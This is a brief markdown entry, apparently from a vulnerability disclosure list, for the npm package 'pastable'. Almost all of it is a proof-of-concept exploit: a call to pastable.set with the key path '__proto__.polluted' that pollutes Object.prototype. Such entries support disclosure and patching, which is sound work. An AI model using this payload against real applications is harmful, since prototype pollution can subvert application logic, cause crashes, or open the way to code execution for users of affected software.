# pastable

- package name: `pastable`

- PoC exploit:

```javascript
var pastable = require('pastable');
pastable.set({}, '__proto__.polluted', 'yes');
// Object.prototype.polluted === 'yes'
```